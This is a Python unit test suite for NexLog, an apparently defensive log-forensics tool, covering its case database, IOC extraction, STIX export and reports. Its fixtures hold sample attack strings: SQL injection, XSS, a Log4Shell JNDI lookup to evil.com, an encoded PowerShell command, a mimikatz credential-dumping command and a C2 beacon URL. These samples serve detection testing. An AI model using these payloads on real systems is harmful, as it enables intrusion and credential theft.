"""
tests/unit/test_layer3.py â€” NexLog Layer 3
Tests: CaseDB, IOCExtractor, ReportBuilder, ip_utils, timestamps
Run from any location: python test_layer3.py
"""

import json
import os
import sys
import tempfile
from datetime import datetime, timezone

# â”€â”€ Self-locating path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT
for _p in ['core', 'detection', 'storage', 'intelligence', 'output', 'utils']:
    sys.path.insert(0, os.path.join(_ROOT, _p))

from finding import Finding, Severity, MitreTag
from case_db import CaseDB
from ioc_extractor import IOCExtractor
from report_builder import ReportBuilder, _HARDENING
from ip_utils import (classify_ip, is_private, is_public,
                      extract_ips, ips_same_subnet, is_tor_exit_range)
from timestamps import (parse_apache, parse_syslog,
                        parse_iso8601, format_for_report)

# â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_passed = _failed = 0

def check(name: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1; print(f"  PASS  {name}")
    else:
        _failed += 1; print(f"  FAIL  {name}" + (f"  [{detail}]" if detail else ""))

_TS = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

def make_finding(
    rule_id="WEB-001", cat="web_attack",
    sev=Severity.HIGH, conf=0.87,
    source_ip="203.0.113.5",
    hostname="webserver01",
    process_name="apache2",
    event_id="4688",
    trigger_line="GET /login?q='+OR+1=1",
    supporting=None,
) -> Finding:
    return Finding(
        rule_id=rule_id, rule_name="Test Rule", description="test",
        severity=sev, confidence=conf, category=cat,
        mitre_tags=[MitreTag("TA0001","Initial Access","T1190","Exploit",".001")],
        source_ip=source_ip,
        hostname=hostname,
        process_name=process_name,
        event_id=event_id,
        timestamp=_TS,
        trigger_line=trigger_line,
        supporting_lines=supporting or ["line1","line2"],
    )


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. CaseDB â€” lifecycle + sessions
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_case_db_lifecycle():
    print("\nâ”€â”€ 1. CaseDB lifecycle â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        path = f.name
    try:
        with CaseDB(path) as db:
            check("opens cleanly",             db._conn is not None)
            check("schema_version written",    db.get_meta("schema_version") is not None)
            check("created_at written",        db.get_meta("created_at") is not None)

            # Session
            sid = db.create_session(
                source_file="access.log", sha256="abc123",
                file_size=1024, rules_loaded=162, entries_parsed=400,
            )
            check("session_id is str",         isinstance(sid, str) and len(sid) == 36)
            sess = db.get_session(sid)
            check("session retrieved",         sess is not None)
            check("source_file stored",        sess["source_file"] == "access.log")
            check("rules_loaded stored",       sess["rules_loaded"] == 162)
            check("entries_parsed stored",     sess["entries_parsed"] == 400)

            # update_session
            db.update_session(sid, entries_parsed=500)
            check("update_session works",      db.get_session(sid)["entries_parsed"] == 500)

            check("list_sessions length",      len(db.list_sessions()) == 1)
    finally:
        os.unlink(path)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. CaseDB â€” findings round-trip including all Layer 2 v2 fields
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_case_db_findings():
    print("\nâ”€â”€ 2. CaseDB findings round-trip â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        path = f.name
    try:
        with CaseDB(path) as db:
            sid = db.create_session(source_file="test.log", sha256="x", file_size=0)
            findings = [
                make_finding("WEB-001","web_attack",Severity.HIGH,   0.90,
                             "1.2.3.4","web01","nginx","",
                             "GET /?q='+OR+1=1"),
                make_finding("AUTH-001","auth",     Severity.CRITICAL,0.95,
                             "5.5.5.5","dc01","sshd","4625",
                             "Failed password for root"),
                make_finding("MAL-001","malware",   Severity.HIGH,   0.80,
                             "9.9.9.9","srv02","powershell","4688",
                             "powershell -enc AAAA"),
            ]
            n = db.save_findings(findings, sid)
            check("save count == 3",           n == 3)

            # get_findings â€” all
            restored = db.get_findings(session_id=sid)
            check("get_findings returns 3",    len(restored) == 3)

            # Verify new Layer 2 fields survive round-trip
            web = next(f for f in restored if f.rule_id == "WEB-001")
            check("hostname round-trips",      web.hostname == "web01")
            check("process_name round-trips",  web.process_name == "nginx")
            check("supporting_lines round-trip", "line1" in web.supporting_lines)
            check("risk_score round-trips",    web.risk_score > 0)
            check("mitre_tags as MitreTag",    len(web.mitre_tags) == 1)
            check("technique_ids available",   "T1190.001" in web.technique_ids)
            check("tactic_names available",    "Initial Access" in web.tactic_names)

            # Filters â€” by severity string
            high = db.get_findings(session_id=sid, min_severity="CRITICAL")
            check("min_severity filter",       len(high) == 1)

            # Filter by category
            auth = db.get_findings(session_id=sid, category="auth")
            check("category filter",           len(auth) == 1)

            # Filter by hostname (new)
            dc = db.get_findings(session_id=sid, hostname="dc01")
            check("hostname filter",           len(dc) == 1)

            # Filter by risk_score
            risky = db.get_findings(session_id=sid, min_risk_score=8.0)
            check("min_risk_score filter",     len(risky) >= 1)

            # get_findings_summary
            summary = db.get_findings_summary(session_id=sid)
            check("summary total == 3",        summary["total"] == 3)
            check("summary by_severity",       "HIGH" in summary["by_severity"])
            check("summary by_category",       "web_attack" in summary["by_category"])
            check("summary top_source_ips",    "1.2.3.4" in summary["top_source_ips"])
            check("summary top_hostnames",     "web01" in summary["top_hostnames"])
            check("summary max_risk_score",    summary["max_risk_score"] > 0)
            check("summary avg_risk_score",    summary["avg_risk_score"] > 0)

            fid = getattr(web, "_db_id", "")
            aid = db.add_analyst_action(fid, "triaged", "analyst1", "reviewed")
            check("analyst action id returned", isinstance(aid, str) and bool(aid))
            check("finding state triaged", db.get_finding_state(fid) == "triaged")
            actions = db.get_analyst_actions(finding_id=fid)
            check("action trail stored", len(actions) == 1)
            try:
                db.add_analyst_action(fid, "invalid", "analyst1")
                check("invalid action rejected", False)
            except ValueError:
                check("invalid action rejected", True)
    finally:
        os.unlink(path)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3. CaseDB â€” evidence chain-of-custody + verify
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_case_db_evidence():
    print("\nâ”€â”€ 3. CaseDB evidence / chain of custody â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as fdb:
        db_path = fdb.name
    with tempfile.NamedTemporaryFile(mode="w", suffix=".log",
                                     delete=False, encoding="utf-8") as flog:
        flog.write("test log content\n")
        log_path = flog.name

    import hashlib
    sha = hashlib.sha256(open(log_path,"rb").read()).hexdigest()

    try:
        with CaseDB(db_path) as db:
            sid = db.create_session(source_file=log_path, sha256=sha, file_size=18)
            eid = db.record_evidence(
                file_path=log_path, sha256=sha, file_size=18,
                session_id=sid, log_format="syslog",
                lines_parsed=1, findings_count=0,
            )
            check("evidence_id returned",      isinstance(eid, str))

            ev = db.get_evidence(session_id=sid)
            check("evidence record stored",    len(ev) == 1)
            check("sha256 stored correctly",   ev[0]["sha256"] == sha)
            check("lines_parsed stored",       ev[0]["lines_parsed"] == 1)

            result = db.verify_evidence(eid)
            check("verify_evidence verified",  result["verified"] is True)
            check("verify_evidence status",    result["status"] == "verified")
            check("stored_hash matches",       result["stored_hash"] == sha)
            check("current_hash matches",      result["current_hash"] == sha)

            integrity = db.verify_case_integrity(session_id=sid)
            check("case integrity trusted",    integrity["status"] == "trusted")
            check("case hash present",         len(integrity["case_sha256"]) == 64)

            with open(log_path, "a", encoding="utf-8") as fh:
                fh.write("tamper\n")
            changed = db.verify_evidence(eid)
            check("changed file detected",     changed["status"] == "changed")
            integrity2 = db.verify_case_integrity(session_id=sid)
            check("case integrity compromised", integrity2["status"] == "compromised")

            os.unlink(log_path)
            missing = db.verify_evidence(eid)
            check("missing file detected",     missing["status"] == "missing")

            bad = db.verify_evidence("nonexistent-id")
            check("bad id returns error dict", bad["verified"] is False)
    finally:
        os.unlink(db_path)
        if os.path.exists(log_path):
            os.unlink(log_path)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 4. CaseDB â€” notes + attack chains
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_case_db_notes_and_chains():
    print("\nâ”€â”€ 4. CaseDB notes + attack chains â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        path = f.name
    try:
        with CaseDB(path) as db:
            sid = db.create_session()

            nid = db.add_note("Attacker IP confirmed botnet", sid, "analyst1")
            check("note_id returned",          isinstance(nid, str))
            notes = db.get_notes(session_id=sid)
            check("note retrieved",            len(notes) == 1)
            check("note content stored",       "botnet" in notes[0]["note"])
            check("analyst stored",            notes[0]["analyst"] == "analyst1")

            chains = [
                {"chain_name":"Full Web Compromise","source_ip":"1.2.3.4",
                 "categories":["recon","web_attack"],"finding_count":3,
                 "max_risk_score":8.5,"confidence_boost":0.15},
            ]
            n = db.save_attack_chains(chains, sid)
            check("chains saved",              n == 1)
            retrieved = db.get_attack_chains(session_id=sid)
            check("chain retrieved",           len(retrieved) == 1)
            check("chain_name stored",         retrieved[0]["chain_name"] == "Full Web Compromise")
            check("max_risk_score stored",     retrieved[0]["max_risk_score"] == 8.5)

            # set_meta / get_meta
            db.set_meta("case_name", "Test Investigation 2026")
            check("meta round-trips",          db.get_meta("case_name") == "Test Investigation 2026")
            meta = db.get_all_meta()
            check("get_all_meta returns dict", isinstance(meta, dict))
    finally:
        os.unlink(path)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5. IOCExtractor â€” core extraction including new Layer 2 fields
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_ioc_extractor_fields():
    print("\nâ”€â”€ 5. IOCExtractor â€” new Layer 2 fields â”€â”€â”€â”€")
    ext = IOCExtractor(include_private_ips=False)

    f = make_finding(
        source_ip="185.220.100.5",
        hostname="attacker-c2.evil.com",
        process_name="mimikatz",
        trigger_line="C:\\Users\\evil\\mimikatz.exe sekurlsa::logonpasswords",
        supporting=["hash: d41d8cd98f00b204e9800998ecf8427e",
                    "connecting to https://c2.attacker.net/beacon"],
    )
    iocs = ext.extract([f])
    types = {i.ioc_type for i in iocs}

    check("ipv4 extracted",           "ipv4" in types,
          f"types={types}")
    check("hostname extracted",       "hostname" in types,
          f"types={types}")
    check("process extracted",        "process" in types,
          f"types={types}")
    check("hash_md5 from supp lines", "hash_md5" in types,
          f"types={types}")
    # URLs from raw text are extracted as domains (URL extraction is URI-only).
    # Full URL objects are only produced from http_uri_decoded indicator field.
    check("domain from supp lines",   "domain" in types,
          f"types={types}")
    check("domain from supp lines",   "domain" in types,
          f"types={types}")
    check("file_path extracted",      "file_path" in types,
          f"types={types}")

    # Verify hostname IOC value
    hn_iocs = [i for i in iocs if i.ioc_type == "hostname"]
    check("hostname value correct",   any("evil.com" in i.value for i in hn_iocs))

    # Verify process IOC value
    proc_iocs = [i for i in iocs if i.ioc_type == "process"]
    check("process value is mimikatz", any("mimikatz" in i.value.lower() for i in proc_iocs))


def test_ioc_extractor_dedup():
    print("\nâ”€â”€ 6. IOCExtractor deduplication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    ext = IOCExtractor(include_private_ips=False)
    f1  = make_finding(source_ip="1.2.3.4", conf=0.80)
    f2  = make_finding(source_ip="1.2.3.4", conf=0.95)
    iocs = ext.extract([f1, f2])
    ip_iocs = [i for i in iocs if i.ioc_type == "ipv4" and i.value == "1.2.3.4"]
    check("IP deduplicated to 1",      len(ip_iocs) == 1)
    check("highest confidence kept",   ip_iocs[0].confidence >= 0.95)

    # Private IPs excluded by default
    priv = make_finding(source_ip="192.168.1.1")
    iocs2 = ext.extract([priv])
    priv_ips = [i for i in iocs2 if i.ioc_type == "ipv4"
                and i.value == "192.168.1.1"]
    check("private IP excluded",       len(priv_ips) == 0)


def test_ioc_extractor_exports():
    print("\nâ”€â”€ 7. IOCExtractor CSV + STIX export â”€â”€â”€â”€â”€â”€â”€")
    ext  = IOCExtractor(include_private_ips=False)
    iocs = ext.extract([
        make_finding(source_ip="203.0.113.99", hostname="c2.evil.net")
    ])
    check("iocs produced",             len(iocs) > 0)

    csv_str = ext.to_csv(iocs)
    check("CSV has header",            "type,value" in csv_str)
    check("CSV has rows",              csv_str.count("\n") >= 2)

    stix_str = ext.to_stix_bundle(iocs, case_name="Test Case")
    try:
        bundle = json.loads(stix_str)
        check("STIX is valid JSON",    True)
        check("STIX type == bundle",   bundle["type"] == "bundle")
        check("STIX spec 2.1",         bundle["spec_version"] == "2.1")
        check("STIX has objects",      len(bundle["objects"]) >= 2)
        indicator = next((o for o in bundle["objects"]
                          if o["type"] == "indicator"), None)
        check("STIX has indicator",    indicator is not None)
        if indicator:
            check("indicator has pattern", "pattern" in indicator)
            check("indicator has confidence", "confidence" in indicator)
    except json.JSONDecodeError as e:
        check("STIX is valid JSON",    False, str(e))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 8. ReportBuilder
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_report_builder():
    print("\nâ”€â”€ 8. ReportBuilder all formats â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        path = f.name
    try:
        with CaseDB(path) as db:
            sid = db.create_session(
                source_file="access.log", sha256="abc123def456",
                file_size=4096, rules_loaded=162, entries_parsed=200,
            )
            findings = [
                make_finding("WEB-001","web_attack",Severity.HIGH,   0.90,
                             "1.1.1.1","web01","nginx",""),
                make_finding("AUTH-001","auth",     Severity.CRITICAL,0.95,
                             "2.2.2.2","dc01","sshd","4625"),
                make_finding("DISC-008","discovery", Severity.CRITICAL,0.96,
                             "3.3.3.3","app01","java",""),
            ]
            db.save_findings(findings, sid)
            db.record_evidence("access.log","abc123",1024,sid,"apache",200,3)
            db.add_note("Log4Shell attempt from 3.3.3.3", sid)
            db.save_attack_chains([
                {"chain_name":"Full Web Compromise","source_ip":"1.1.1.1",
                 "categories":["recon","web_attack"],"finding_count":2,
                 "max_risk_score":7.5,"confidence_boost":0.15}
            ], sid)

            builder = ReportBuilder(db, session_id=sid)

            # JSON report
            jr = json.loads(builder.to_json())
            check("JSON has report_meta",          "report_meta" in jr)
            check("JSON has executive_summary",    "executive_summary" in jr)
            check("JSON es has affected_hosts",    "affected_hosts" in jr["executive_summary"])
            check("JSON es has max_risk_score",    "max_risk_score" in jr["executive_summary"])
            check("JSON es has avg_risk_score",    "avg_risk_score" in jr["executive_summary"])
            check("JSON timeline has hostname",
                  all("hostname" in e for e in jr["timeline"]))
            check("JSON timeline has risk_score",
                  all("risk_score" in e for e in jr["timeline"]))
            check("JSON has attack_chains",        len(jr["attack_chains"]) == 1)
            check("JSON has hardening",            len(jr["hardening_recommendations"]) > 0)
            check("JSON has integrity_summary",    "integrity_summary" in jr)
            check("JSON has evidence verifications", "evidence_verifications" in jr)
            check("JSON has action trail",         "analyst_action_trail" in jr)
            check("JSON has finding provenance",   "finding_provenance" in jr)
            check("JSON is serialisable",          True)   # already parsed above

            # Text report
            txt = builder.to_text()
            check("text has EXECUTIVE SUMMARY",    "EXECUTIVE SUMMARY" in txt)
            check("text has Affected hosts",        "Affected hosts" in txt)
            check("text has Max risk score",        "Max risk score" in txt)
            check("text has CHAIN OF CUSTODY",      "CHAIN OF CUSTODY" in txt)
            check("text has EVIDENCE INTEGRITY",    "EVIDENCE INTEGRITY" in txt)
            check("text has ATTACK CHAINS",         "ATTACK CHAINS" in txt)
            check("text has HARDENING",             "HARDENING" in txt)
            check("text has ANALYST NOTES",         "ANALYST NOTES" in txt)

            # Markdown report
            md = builder.to_markdown()
            check("markdown starts with #",        md.startswith("# Forensic"))
            check("markdown has ## Timeline",      "## Timeline" in md)
            check("markdown table has Host col",   "| Host |" in md)
            check("markdown has ## Hardening",     "## Hardening" in md)
            check("markdown has ## Evidence Integrity", "## Evidence Integrity" in md)
            check("markdown has ## Chain",         "## Chain of Custody" in md)
            check("markdown has Analyst Notes",    "## Analyst Notes" in md)
    finally:
        os.unlink(path)


def test_hardening_coverage():
    print("\nâ”€â”€ 9. Hardening category coverage â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    required = [
        "web_attack","auth","malware","persistence","lateral_movement",
        "privilege_escalation","exfiltration","recon","discovery","impact",
        "supply_chain","cloud_attack","ai_attack",
        "lolbin","api_attack","network_attack",
        "insider_threat","bot_activity","defense_evasion",
    ]
    for cat in required:
        check(f"_HARDENING has '{cat}'",
              cat in _HARDENING and len(_HARDENING[cat]) >= 3,
              f"len={len(_HARDENING.get(cat,[]))}")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 10. ip_utils
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_ip_utils():
    print("\nâ”€â”€ 10. ip_utils â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    check("10.x private",              is_private("10.0.0.1"))
    check("192.168.x private",         is_private("192.168.1.1"))
    check("172.16.x private",          is_private("172.16.0.1"))
    check("127.0.0.1 private",         is_private("127.0.0.1"))
    check("8.8.8.8 public",            is_public("8.8.8.8"))
    # 203.0.113.0/24 is TEST-NET-3 (RFC 5737) â€” Python 3.11+ marks it private.
    # classify_ip() correctly returns "documentation", is_public returns False.
    check("203.0.113.5 classify doc",  classify_ip("203.0.113.5") == "documentation")

    check("classify loopback",         classify_ip("127.0.0.1") == "loopback")
    check("classify private",          classify_ip("10.0.0.1")  == "private")
    check("classify documentation",    classify_ip("203.0.113.1") == "documentation")
    check("classify public",           classify_ip("8.8.8.8")   == "public")
    check("classify invalid",          classify_ip("999.999.999.999") == "invalid")

    ips = extract_ips("Traffic from 1.2.3.4 and 5.6.7.8 to 10.0.0.1")
    check("extract_ips finds 3",       len(ips) == 3)
    check("extract_ips ordered",       ips[0] == "1.2.3.4")

    check("same /24 subnet",           ips_same_subnet("192.168.1.5","192.168.1.200"))
    check("different /24 subnet",  not ips_same_subnet("192.168.1.5","192.168.2.1"))

    check("tor range detected",        is_tor_exit_range("185.220.100.1"))
    check("non-tor not detected",  not is_tor_exit_range("8.8.8.8"))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 11. timestamps
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_timestamps():
    print("\nâ”€â”€ 11. timestamps â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    dt = parse_apache("04/Jan/2026:10:00:22 +0000")
    check("parse_apache returns datetime",   dt is not None)
    check("parse_apache is UTC",             dt.tzinfo is not None)
    check("parse_apache day correct",        dt.day == 4)
    check("parse_apache hour correct",       dt.hour == 10)

    dt2 = parse_apache("04/Jan/2026:12:00:00 +0530")
    check("parse_apache tz offset correct",  dt2.hour == 6)  # 12:00 +05:30 = 06:30 UTC

    dt3 = parse_syslog("Jan  4 10:01:32", year=2026)
    check("parse_syslog returns datetime",   dt3 is not None)
    check("parse_syslog month correct",      dt3.month == 1)
    check("parse_syslog second correct",     dt3.second == 32)

    dt4 = parse_iso8601("2026-01-04T10:00:00Z")
    check("parse_iso8601 Z suffix",          dt4 is not None)
    check("parse_iso8601 is UTC",            dt4.tzinfo is not None)

    dt5 = parse_iso8601("2026-01-04T10:00:00+05:30")
    check("parse_iso8601 offset",            dt5 is not None)
    check("parse_iso8601 offset to UTC",     dt5.hour == 4)

    check("parse_apache None on bad",        parse_apache("not-a-date") is None)
    check("parse_syslog None on bad",        parse_syslog("not-a-date") is None)
    check("parse_iso8601 None on bad",       parse_iso8601("not-a-date") is None)
    check("parse_iso8601 None on empty",     parse_iso8601("") is None)

    s = format_for_report(dt)
    check("format_for_report is str",        isinstance(s, str))
    check("format_for_report has UTC",       "UTC" in s)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 12. Full Layer 1 â†’ 2 â†’ 3 integration
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_full_pipeline():
    print("\nâ”€â”€ 12. Full L1â†’L2â†’L3 integration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    core_path = os.path.join(_ROOT, "core")
    det_path  = os.path.join(_ROOT, "detection", "rules")
    if not os.path.exists(core_path) or not os.path.exists(det_path):
        print("  SKIP  core/ or rules/ not found"); return

    sys.path.insert(0, core_path)
    from engine import Engine      # type: ignore
    from rule_engine import RuleEngine

    log_lines = [
        '203.0.113.5 - - [04/Jan/2026:10:00:01 +0000] '
        '"GET /login?user=admin\'+OR+1=1-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"',
        '1.1.1.1 - - [04/Jan/2026:10:00:02 +0000] '
        '"GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 256 "-" "curl/7.0"',
        '185.220.100.5 - - [04/Jan/2026:10:00:03 +0000] '
        '"GET / HTTP/1.1" 200 100 "-" "${jndi:ldap://evil.com/x}"',
    ]
    with tempfile.NamedTemporaryFile(mode="w",suffix=".log",
                                     delete=False,encoding="utf-8") as f:
        f.write("\n".join(log_lines)+"\n")
        log_tmp = f.name
    with tempfile.NamedTemporaryFile(suffix=".facase",delete=False) as f:
        db_tmp = f.name

    try:
        # Layer 1
        parse  = Engine()
        detect = RuleEngine(det_path)
        all_findings = []
        for entry in parse.parse(log_tmp):
            all_findings.extend(detect.evaluate(entry))

        check("L1â†’L2 findings produced",   len(all_findings) > 0)

        # Layer 3 â€” store
        with CaseDB(db_tmp) as db:
            sid = db.create_session(
                source_file=log_tmp,
                sha256=parse.file_meta.get("sha256",""),
                file_size=parse.file_meta.get("size",0),
                rules_loaded=detect._rules_loaded,
                entries_parsed=detect._total_evaluated,
            )
            db.record_evidence(
                log_tmp,
                sha256=parse.file_meta.get("sha256",""),
                file_size=parse.file_meta.get("size",0),
                session_id=sid,
                lines_parsed=detect._total_evaluated,
                findings_count=len(all_findings),
            )
            n = db.save_findings(all_findings, sid)
            check("findings saved to DB",   n == len(all_findings))

            db.add_note("Automated test run", sid)

            # IOC extraction
            ext  = IOCExtractor()
            iocs = ext.extract(all_findings)
            check("IOCs extracted",         len(iocs) > 0)
            csv_out = ext.to_csv(iocs)
            check("CSV export works",       "type" in csv_out)

            # Report
            builder = ReportBuilder(db, session_id=sid)
            jr      = json.loads(builder.to_json())
            check("report total_findings",  jr["executive_summary"]["total_findings"] > 0)
            check("report has sha256",      bool(jr["report_meta"]["sha256"]))
            check("report has timeline",    len(jr["timeline"]) > 0)
            check("report has hardening",   len(jr["hardening_recommendations"]) > 0)

            # Verify round-trip
            restored = db.get_findings(session_id=sid)
            for rf in restored:
                d = rf.to_dict()
                from finding import Finding as F
                F.from_dict(d)   # must not raise
            check("from_dict round-trip OK", True)

    finally:
        os.unlink(log_tmp)
        os.unlink(db_tmp)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# main
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
if __name__ == "__main__":
    print("=" * 58)
    print("  NexLog Layer 3 â€” Complete Test Suite")
    print("=" * 58)

    test_case_db_lifecycle()
    test_case_db_findings()
    test_case_db_evidence()
    test_case_db_notes_and_chains()
    test_ioc_extractor_fields()
    test_ioc_extractor_dedup()
    test_ioc_extractor_exports()
    test_report_builder()
    test_hardening_coverage()
    test_ip_utils()
    test_timestamps()
    test_full_pipeline()

    print(f"\n{'=' * 58}")
    print(f"  Results:  {_passed} passed Â· {_failed} failed")
    print(f"{'=' * 58}")
    if _failed:
        raise SystemExit(1)
